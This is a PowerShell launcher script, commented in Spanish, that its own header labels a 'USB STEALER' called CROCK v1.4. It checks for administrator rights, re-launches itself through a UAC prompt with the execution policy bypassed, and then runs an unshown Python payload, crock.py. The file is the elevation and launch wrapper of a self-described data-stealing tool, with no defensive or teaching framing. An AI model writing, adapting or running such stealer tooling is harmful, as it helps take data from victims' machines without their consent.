# CROCK v1.4 - USB STEALER - RUN WITH ADMIN PRIVILEGES (PowerShell)

Write-Host "[*] Verificando permisos de administrador..."
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")

if (-not $isAdmin) {
    Write-Host "[*] Solicitando permisos de administrador..."
    Write-Host "[*] Por favor confirma en la ventana de UAC..." -ForegroundColor Yellow
    
    # Re-ejecutar el script con admin
    $arguments = "-NoExit -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    Start-Process PowerShell -ArgumentList $arguments -Verb RunAs
    exit
}

Write-Host "[+] Ejecutando CROCK v1.4 con permisos de administrador..." -ForegroundColor Green
Write-Host ""

Set-Location $PSScriptRoot
python crock.py

Write-Host ""
Write-Host "[+] Presiona Enter para salir..."
Read-Host
